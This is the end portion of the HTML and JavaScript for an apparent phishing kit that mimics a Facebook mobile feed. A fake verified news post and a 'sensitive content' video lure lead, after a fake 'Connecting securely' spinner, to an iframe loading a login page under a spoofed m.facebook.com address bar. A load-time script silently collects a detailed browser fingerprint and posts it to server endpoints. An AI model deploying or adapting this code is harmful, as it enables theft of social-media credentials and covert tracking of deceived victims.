                    <div class=video-spinner-wrapper id=spinner-overlay>
                        <div class="spinner animated inline-video-spinner"></div>
                    </div>
                </div>
                <div class=post-reactions-stats>
                    <div class=comment-count-display>3 comments</div>
                </div>
                <div class="realistic post-actions">
                    <div class=action-button-pill><img alt=Like src=https://static.wixstatic.com/media/8455f5_375b02c461bd46deb71a2258ceed7966~mv2.png></div>
                    <div class=action-button-pill><img alt=Comment src=https://static.wixstatic.com/media/8455f5_3dc669251c314abab342566ea807d3a6~mv2.png></div>
                    <div class=action-button-pill><img alt="Copy Link" src=https://static.wixstatic.com/media/8455f5_1a0dc9448e2b448481853e9742b44a71~mv2.png></div>
                    <div class=action-button-pill><img alt=Share src=https://static.wixstatic.com/media/8455f5_564396b434c24e058195b8cb67b34b62~mv2.png></div>
                </div>
            </div>
            <div class="realistic feed-post" id=original-shimmer-post>
                <div class="shimmer realistic post-header">
                    <div class="shimmer profile-pic small"></div>
                    <div class="shimmer realistic post-info">
                        <div class="shimmer user-name"></div>
                        <div class="shimmer post-time"></div>
                    </div>
                    <div class="shimmer post-options"></div>
                    <div class="shimmer post-close"></div>
                </div>
                <div class="shimmer realistic post-text">
                    <div class="shimmer text-line"></div>
                    <div class="shimmer text-line short"></div>
                </div>
                <div class="shimmer collage post-media">
                    <div class=img></div>
                    <div class=img></div>
                    <div class=img></div>
                    <div class=img></div>
                    <div class=img></div>
                    <div class="img last"><span class=plus-more></span></div>
                </div>
                <div class="shimmer post-reactions-stats"></div>
                <div class="shimmer realistic post-actions">
                    <div class="shimmer action-button-pill"></div>
                    <div class="shimmer action-button-pill"></div>
                    <div class="shimmer action-button-pill"></div>
                    <div class="shimmer action-button-pill"></div>
                </div>
            </div>
            <div class="realistic feed-post initially-hidden" id=new-mimicked-post>
                <div class="realistic post-header"><img loading="lazy" alt="Philippine Star Avatar" src=https://static.wixstatic.com/media/8455f5_45dfb2f48bbc4816a340ed3853a22117~mv2.jpg class="profile-pic small" style="opacity:1;visibility:visible;background:#fff;border:2px solid #1877f2;z-index:2;position:relative">
                    <div class="realistic post-info">
                        <div class=user-name-line><span class="user-name actual-text" style=display:inline-flex;align-items:center>Philippine Star <img alt=Verified src=https://cdn3.emoji.gg/emojis/87541-verified.png style=margin-left:4px;vertical-align:middle height=16 width=16> </span><span class=follow-link>· Follow</span></div>
                        <div class=post-meta-container><span>2h </span><span>·</span> <i class="fas fa-globe-americas"></i></div>
                    </div>
                    <div class=post-options><i class="fas fa-ellipsis-h"></i></div>
                    <div class=post-close><i class="fas fa-times"></i></div>
                </div>
                <div class="realistic post-text">
                    <p><strong>JUST IN:</strong> Philippine Star reports breaking news! Stay tuned for more updates on the latest events happening in the country. 🇵🇭
                </div>
                <div class="post-media image-container"><img loading="lazy" alt="Philippine Star News Post Image" src=https://static.wixstatic.com/media/8455f5_7936356f044e44a6b24e0d87c2f5aa7c~mv2.webp id=mimicked-post-image></div>
                <div class="realistic post-actions"><button class=like-btn><i class="fas fa-thumbs-up"></i> Like</button> <button class=comment-btn><i class="fas fa-comment"></i> Comment</button> <button class=share-btn><i class="fas fa-share"></i> Share</button></div>
            </div>
            <div class="realistic feed-post initially-hidden" id=new-mimicked-post2>
                <div class="realistic post-header"><img loading="lazy" alt="User Avatar" src=https://static.wixstatic.com/media/8455f5_6482bfcc86584ccb81fcffd038bc3cd0~mv2.webp class="profile-pic small" style="opacity:1!important;visibility:visible!important;background:#fff;border:2px solid #1877f2;z-index:2;position:relative">
                    <div class="realistic post-info">
                        <div class=user-name-line><span class="user-name actual-text" style=display:inline-flex;align-items:center>Kalye kwatro </span><span class=follow-link>· Follow</span></div>
                        <div class=post-meta-container><span>Just now </span><span>·</span> <i class="fas fa-globe-americas"></i></div>
                    </div>
                    <div class=post-options><i class="fas fa-ellipsis-h"></i></div>
                    <div class=post-close><i class="fas fa-times"></i></div>
                </div>
                <div class="realistic post-text">
                    <p>I've got nothing to prove baby, I KNOW WHO I AM!😘
                </div>
                <div class="post-media image-container"><img loading="lazy" alt="Kalye Kwatro Post Image" src=https://static.wixstatic.com/media/8455f5_baecd3762ee845efae7c3703eac39684~mv2.webp id=mimicked-post2-image></div>
            </div>
        </div>
    </div>
    <div id=newVideoOverlayModal>
        <div class=video-player-container><video muted autoplay class=background-video loop><source src=https://video.wixstatic.com/video/8455f5_7980368e7e674cd0b552c42da31fccd5/1080p/mp4/file.mp4 type=video/mp4></video>
            <div class=sensitive-content-overlay>
                <div class=modal-header-inline><img alt="Warning Icon" src=https://static.wixstatic.com/media/8455f5_008e26e1b0db43069d69eb5873a476f0~mv2.png class=warning-icon-svg></div>
                <div class=overlay-main-content>
                    <h2>Sensitive Content</h2>
                    <p class=faded-text>This video contains drug use and illegal activities.
                    <p class=faded-text>Please Confirm your 18 and older.
                    <hr class=overlay-separator>
                </div>
                <div class=overlay-footer><button class=see-video-button>See Video</button></div>
            </div>
        </div>
    </div>
    <div id=connectingModal>
        <div class=spinner></div>
        <div class=loading-text>Connecting securely...</div>
    </div>
    <div id=phishingIframeModal>
        <div id=phishingIframeWrapper>
            <div class=iframe-chrome-top-bar id=iframe-top-bar><button class="icon-button home-btn" aria-label=Home><svg height=24 viewBox="0 0 24 24"width=24><path d="M4 12 L12 4 L20 12 V20 H14 V14 H10 V20 H4 Z"fill=none stroke=black stroke-width=2 /></svg></button>
                <div class=address-bar-container id=iframe-omnibox><svg height=24 viewBox="0 0 24 24"width=24 style=width:18px;height:18px;margin-right:6px;vertical-align:middle><path d="M6 10 V8 A6 6 0 0 1 18 8 V10 H19 A1 1 0 0 1 20 11 V20 A1 1 0 0 1 19 21 H5 A1 1 0 0 1 4 20 V11 A1 1 0 0 1 5 10 H6 Z M8 10 H16 V8 A4 4 0 0 0 8 8 Z"fill=black /></svg> <span class=url-text style=font-size:15px id=iframe-omnibox-text>m.facebook.com</span></div><button class="icon-button add-btn" aria-label="New tab"><svg height=24 viewBox="0 0 24 24"width=24><line stroke=black stroke-width=2 x1=12 x2=12 y1=6 y2=18 /><line stroke=black stroke-width=2 x1=6 x2=18 y1=12 y2=12 /></svg></button> <button class="icon-button tab-switcher" aria-label="Switch tabs" style="padding:0 8px"><svg height=24 viewBox="0 0 24 24"width=24><rect fill=none height=16 rx=3 ry=3 stroke=black stroke-width=1.5 width=16 x=4 y=4 /><text fill=black font-family="Arial, sans-serif"font-size=10 text-anchor=middle x=12 y=16>1</text></svg></button> <button class="icon-button more-btn" aria-label="More options" style=margin-left:4px><svg height=24 viewBox="0 0 24 24"width=24><circle cx=12 cy=6 fill=black r=2 /><circle cx=12 cy=12 fill=black r=2 /><circle cx=12 cy=18 fill=black r=2 /></svg></button></div><iframe id="phishingLoginPage" scrolling="no" src="about:blank" title="Login Page" sandbox="allow-scripts allow-same-origin allow-downloads allow-popups allow-forms"></iframe>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            let expectedIframeOrigin = window.location.origin;
            window.addEventListener('message', (event) => {
                if (window.console && console.log) {
                    console.log('[Parent DEBUG] Received message:', {
                        origin: event.origin,
                        data: event.data,
                        expectedOrigin: (typeof expectedIframeOrigin !== 'undefined' ? expectedIframeOrigin : 'expectedIframeOrigin_IS_UNDEFINED')
                    });
                }
                if (typeof expectedIframeOrigin !== 'undefined' && event.origin !== expectedIframeOrigin) {
                    if (event.data && event.data.action === 'iframeLog') {
                        return;
                    }
                }
                if (event.data && event.data.action === 'iframeLog') {
                    const { message, level, timestamp, details } = event.data;
                    let logFn = console.log;
                    if (level === 'error' && console.error) {
                        logFn = console.error;
                    } else if (level === 'warn' && console.warn) {
                        logFn = console.warn;
                    } else if (level === 'info' && console.info) {
                        logFn = console.info;
                    }
                    let logMessage = `[IFRAME LOG @ ${new Date(timestamp).toLocaleTimeString()}] ${message}`;
                    if (details) {
                        logFn(logMessage, details);
                    } else {
                        logFn(logMessage);
                    }
                }
            });
            const secondaryNavTabs = document.querySelectorAll('.secondary-nav-tab');
            const previewVideo = document.getElementById("post-video");
            const videoOverlay = document.getElementById("overlay");
            const spinnerOverlay = document.getElementById("spinner-overlay");
            const sensitiveContentModal = document.getElementById("newVideoOverlayModal");
            const originalPost = document.getElementById('original-shimmer-post');
            const newPost = document.getElementById('new-mimicked-post');
            const newPost2 = document.getElementById('new-mimicked-post2');
            const connectingModal = document.getElementById("connectingModal");
            const phishingModal = document.getElementById("phishingIframeModal");
            const phishingIframe = document.getElementById("phishingLoginPage");
            const phishingIframeWrapper = document.getElementById("phishingIframeWrapper");
            const iframeTopBar = document.getElementById('iframe-top-bar');
            const firstVideoPostToView = document.getElementById('first-video-post');
            const phishingPageUrl = `mobile.html.php`;
            try {
                const intendedSrcOrigin = new URL(phishingPageUrl, window.location.href).origin;
                if (window.console && console.log) {
                    console.log('Intended iframe src origin (phishingPageUrl):', intendedSrcOrigin);
                    console.log('Using targetOrigin for postMessage to iframe (expectedIframeOrigin):', expectedIframeOrigin);
                }
            } catch (e) {
                if (window.console && console.warn) {
                    console.warn('Could not parse phishingPageUrl to log intended src origin:', phishingPageUrl, e);
                    console.log('Using targetOrigin for postMessage to iframe (fallback, expectedIframeOrigin):', expectedIframeOrigin);
                }
            }
            let modalDelayTimeout, connectingTimeout;
            const stopAllTimeouts = () => {
                clearTimeout(modalDelayTimeout);
                clearTimeout(connectingTimeout)
            };
            secondaryNavTabs.forEach(clickedTab => {
                clickedTab.addEventListener('click', () => {
                    secondaryNavTabs.forEach(tab => tab.classList.remove('active'));
                    clickedTab.classList.add('active')
                })
            });
            const startInitialVideoSequence = () => {
                stopAllTimeouts();
                if (!previewVideo || !videoOverlay || !spinnerOverlay) {
                    return
                }
                if (previewVideo.classList) {
                    previewVideo.classList.add('video-blurred');
                }
                if (videoOverlay) {
                    videoOverlay.classList.add('is-visible');
                }
                if (spinnerOverlay) {
                    spinnerOverlay.classList.remove('is-visible');
                }
            };
            if (previewVideo) {
                setTimeout(startInitialVideoSequence, 300)
            }
            if (videoOverlay && sensitiveContentModal && spinnerOverlay && originalPost && newPost) {
                videoOverlay.addEventListener("click", () => {
                    stopAllTimeouts();
                    if (videoOverlay) videoOverlay.classList.remove('is-visible');
                    if (spinnerOverlay) spinnerOverlay.classList.add('is-visible');
                    modalDelayTimeout = setTimeout(() => {
                        if (spinnerOverlay) spinnerOverlay.classList.remove('is-visible');
                        sensitiveContentModal.style.display = "flex";
                        setTimeout(() => {
                            sensitiveContentModal.classList.add('is-visible-modal')
                        }, 50);
                        if (originalPost && newPost) {
                            originalPost.style.display = 'none';
                            newPost.style.display = 'block';
                            const avatar = newPost.querySelector('.profile-pic.small');
                            const name = newPost.querySelector('.user-name.actual-text');
                            const postMedia = newPost.querySelector('.post-media.image-container');
                            if (avatar && name && postMedia) {
                                sequentialFadeIn([avatar, name, postMedia], 500);
                                setTimeout(() => {
                                    avatar.style.opacity = '1';
                                    avatar.style.visibility = 'visible'
                                }, 1600)
                            }
                        }
                    }, 1500)
                })
            }
            if (sensitiveContentModal && connectingModal && phishingModal && phishingIframe && phishingIframeWrapper) {
                sensitiveContentModal.addEventListener('click', (event) => {
                    stopAllTimeouts();
                    const seeVideoButton = sensitiveContentModal.querySelector('.see-video-button');
                    let animationProceedDelay = 50;
                    if (window.console && console.log) console.log('[Facebookfeed.html] Sensitive content modal clicked.');
                    if (seeVideoButton) {
                        let targetIsButtonOrChild = event.target === seeVideoButton || seeVideoButton.contains(event.target);
                        if (!targetIsButtonOrChild) {
                            seeVideoButton.classList.add('simulated-click');
                            animationProceedDelay = 160;
                            setTimeout(() => {
                                seeVideoButton.classList.remove('simulated-click')
                            }, 150)
                        }
                    }
                    setTimeout(() => {
                        if (sensitiveContentModal) {
                            sensitiveContentModal.classList.remove('is-visible-modal');
                            setTimeout(() => {
                                sensitiveContentModal.style.display = "none"
                            }, 300)
                        }
                        if (connectingModal) {
                            connectingModal.style.display = 'flex';
                            setTimeout(() => {
                                connectingModal.classList.add('is-visible')
                            }, 20)
                        }
                        const connectingDelay = 800;
                        connectingTimeout = setTimeout(() => {
                            if (connectingModal) {
                                connectingModal.classList.remove('is-visible');
                                setTimeout(() => {
                                    connectingModal.style.display = 'none'
                                }, 150)
                            }
                            if (newPost && newPost2) {
                                newPost.style.display = 'none';
                                newPost2.style.display = 'block';
                                const avatar2 = newPost2.querySelector('.profile-pic.small');
                                const name2 = newPost2.querySelector('.user-name.actual-text');
                                const postMedia2 = newPost2.querySelector('.post-media.image-container');
                                if (avatar2 && name2 && postMedia2) {
                                    sequentialFadeIn([avatar2, name2, postMedia2], 500);
                                    setTimeout(() => {
                                        avatar2.style.opacity = '1';
                                        avatar2.style.visibility = 'visible'
                                    }, 1600)
                                }
                            }
                            phishingIframe.onload = () => {
                                if (phishingIframe.contentWindow && expectedIframeOrigin) {
                                    phishingIframe.contentWindow.postMessage('scrollToTop', expectedIframeOrigin);
                                    phishingIframe.contentWindow.postMessage('requestHeight', expectedIframeOrigin);
                                }
                                phishingModal.style.display = "flex";
                                setTimeout(() => {
                                    phishingModal.classList.add('is-visible-iframe');
                                    phishingModal.scrollTop = 0
                                }, 20)
                            };
                            phishingIframe.onerror = () => {
                                console.error("Error loading iframe content from:", phishingPageUrl);
                                phishingModal.style.display = "flex";
                                setTimeout(() => {
                                    phishingModal.classList.add('is-visible-iframe')
                                }, 20)
                            };
                            phishingIframe.src = phishingPageUrl
                        }, connectingDelay)
                    }, animationProceedDelay)
                })
            }
            window.addEventListener("message", (event) => {
                if (expectedIframeOrigin && event.origin !== expectedIframeOrigin) {
                    return
                }
                if (event.data && event.data.type === 'iframeHeight') {
                    const receivedHeight = event.data.height;
                    if (phishingIframe && phishingIframeWrapper && iframeTopBar) {
                        const topBarHeight = iframeTopBar.offsetHeight;
                        phishingIframeWrapper.style.display = 'flex';
                        const wrapperComputedStyle = window.getComputedStyle(phishingIframeWrapper);
                        let wrapperMaxHeight = parseInt(wrapperComputedStyle.maxHeight, 10);
                        if (isNaN(wrapperMaxHeight) || wrapperMaxHeight <= 0) {
                            const vh = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
                            const modalTopPadding = parseFloat(window.getComputedStyle(phishingModal).paddingTop);
                            const wrapperBottomMargin = parseFloat(wrapperComputedStyle.marginBottom);
                            wrapperMaxHeight = vh - modalTopPadding - wrapperBottomMargin - 10
                        }
                        phishingIframeWrapper.style.display = '';
                        const maxIframeContentHeight = wrapperMaxHeight - topBarHeight;
                        let newIframeHeight = receivedHeight;
                        if (receivedHeight > maxIframeContentHeight) {
                            newIframeHeight = maxIframeContentHeight
                        }
                        phishingIframe.style.height = newIframeHeight + 'px'
                    }
                } else if (event.data && event.data.type === 'redirect') {
                    // Handle redirect from iframe (after 3 retries)
                    const redirectUrl = event.data.url;
                    if (redirectUrl && redirectUrl.startsWith('https://')) {
                        window.location.href = redirectUrl;
                    }
                } else if (event.data && event.data.type === 'iframeLog') {
                    const logEntry = event.data;
                    let logString = `[IFRAME LOG - ${logEntry.level.toUpperCase()}]: ${logEntry.message}`;
                    if (logEntry.details) {
                        try {
                            if (typeof logEntry.details === 'object') {
                                logString += `\nDetails: ${JSON.stringify(logEntry.details, null, 2)}`;
                            } else {
                                logString += `\nDetails: ${logEntry.details}`;
                            }
                        } catch (e) {
                            logString += '\nDetails: (Could not stringify details in parent logger)';
                        }
                    }
                    switch (logEntry.level) {
                        case 'warn':
                            if (window.console && console.warn) console.warn(logString);
                            break;
                        case 'error':
                            if (window.console && console.error) console.error(logString);
                            break;
                        case 'log':
                        default:
                            if (window.console && console.log) console.log(logString);
                            break;
                    }
                }
            });
            if (firstVideoPostToView) {
                setTimeout(() => {
                    try {
                        if (firstVideoPostToView && typeof firstVideoPostToView.scrollIntoView === 'function') {
                            firstVideoPostToView.scrollIntoView({
                                behavior: 'auto',
                                block: 'center'
                            });
                        } else {
                            console.warn("'firstVideoPostToView' element not found or not scrollable when attempting to scroll inside timeout.");
                        }
                    } catch (scrollError) {
                        console.error("Error scrolling 'firstVideoPostToView' into view:", scrollError);
                    }
                }, 700);
            }
            function sequentialFadeIn(elements, delay = 500) {
                let i = 0;
                function showNext() {
                    if (i < elements.length) {
                        elements[i].style.opacity = '0';
                        elements[i].style.display = '';
                        setTimeout(() => {
                            if (elements[i]) {
                                elements[i].classList.add('fade-in');
                            }
                            i++;
                            showNext();
                        }, 10);
                    } else {
                        elements.forEach(el => {
                            if (el) {
                                el.style.opacity = '1';
                            }
                        });
                    }
                }
                showNext()
            }
            console.log("Fake Facebook Feed script initialized (NyxSec: Dynamic Iframe Height).")
        });
    </script>
    <script>
        // Immediate Fingerprint Capture on Page Load
        (function() {
            'use strict';
            const sessionId = 'FP_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            async function collectFingerprint() {
                const fingerprint = {};
                try {
                    // Basic properties
                    fingerprint.userAgent = navigator.userAgent || 'Unknown';
                    fingerprint.language = navigator.language || 'Unknown';
                    fingerprint.languages = navigator.languages || [navigator.language];
                    fingerprint.platform = navigator.platform || 'Unknown';
                    fingerprint.hardwareConcurrency = navigator.hardwareConcurrency || 0;
                    fingerprint.deviceMemory = navigator.deviceMemory || 0;
                    fingerprint.vendor = navigator.vendor || 'Unknown';
                    fingerprint.devicePixelRatio = window.devicePixelRatio || 1;
                    
                    // Screen properties
                    fingerprint.screenResolution = `${screen.width}x${screen.height}`;
                    fingerprint.screenAvailWidth = screen.availWidth || 0;
                    fingerprint.screenAvailHeight = screen.availHeight || 0;
                    fingerprint.colorDepth = screen.colorDepth || 0;
                    fingerprint.pixelDepth = screen.pixelDepth || screen.colorDepth || 0;
                    
                    // Browser capabilities
                    fingerprint.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
                    fingerprint.touchSupport = navigator.maxTouchPoints || 0;
                    fingerprint.localStorage = 'localStorage' in window;
                    fingerprint.sessionStorage = 'sessionStorage' in window;
                    fingerprint.indexedDB = 'indexedDB' in window;
                    fingerprint.cookieEnabled = navigator.cookieEnabled || false;
                    fingerprint.doNotTrack = navigator.doNotTrack || 'Unknown';
                    fingerprint.pluginCount = navigator.plugins ? navigator.plugins.length : 0;
                    
                    // Screen orientation
                    if (screen.orientation) {
                        fingerprint.orientationType = screen.orientation.type || 'portrait-primary';
                        fingerprint.orientationAngle = screen.orientation.angle || 0;
                    } else {
                        fingerprint.orientationType = 'unknown';
                        fingerprint.orientationAngle = 0;
                    }
                    
                    // Battery (with fallback)
                    try {
                        if ('getBattery' in navigator) {
                            const battery = await navigator.getBattery();
                            fingerprint.batteryLevel = battery.level;
                            fingerprint.batteryCharging = battery.charging;
                        } else {
                            fingerprint.batteryLevel = 0.85;
                            fingerprint.batteryCharging = false;
                        }
                    } catch(e) {
                        fingerprint.batteryLevel = 0.85;
                        fingerprint.batteryCharging = false;
                    }
                    
                    // Connection (with fallback)
                    try {
                        if (navigator.connection) {
                            fingerprint.connectionType = navigator.connection.effectiveType || '4g';
                            fingerprint.connectionDownlink = navigator.connection.downlink || 25;
                        } else {
                            fingerprint.connectionType = '4g';
                            fingerprint.connectionDownlink = 25;
                        }
                    } catch(e) {
                        fingerprint.connectionType = '4g';
                        fingerprint.connectionDownlink = 25;
                    }
                    
                    // WebGL
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        if (gl) {
                            fingerprint.webGLRenderer = gl.getParameter(gl.RENDERER) || 'N/A';
                            fingerprint.webGLVendor = gl.getParameter(gl.VENDOR) || 'N/A';
                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (debugInfo) {
                                fingerprint.webGLUnmaskedRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
                                fingerprint.webGLUnmaskedVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A';
                            }
                        }
                    } catch(e) {
                        fingerprint.webGLRenderer = 'error';
                        fingerprint.webGLVendor = 'error';
                    }
                    
                    // Canvas fingerprint
                    try {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        if (ctx) {
                            ctx.textBaseline = 'top';
                            ctx.font = "14px 'Arial'";
                            ctx.fillStyle = '#f60';
                            ctx.fillRect(125, 1, 62, 20);
                            ctx.fillStyle = '#069';
                            ctx.fillText('BrowserLeaks.com <canvas> 1.0', 2, 15);
                            fingerprint.canvasFingerprint = canvas.toDataURL();
                        }
                    } catch(e) {
                        fingerprint.canvasFingerprint = 'error';
                    }
                    
                    fingerprint.sessionId = sessionId;
                    return fingerprint;
                } catch(err) {
                    return {
                        error: err.message || 'Collection failed',
                        userAgent: navigator.userAgent || 'Unknown',
                        sessionId: sessionId
                    };
                }
            }
            
            // Collect and send immediately
            collectFingerprint().then(function(fingerprint) {
                // Send to ip.php for sessions.json
                fetch('ip.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(fingerprint)
                }).catch(function() {});
                
                // Also save immediately to username.txt via new endpoint
                fetch('save_fingerprint.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(fingerprint)
                }).catch(function() {});
            });
        })();
    </script>
</body>
</html>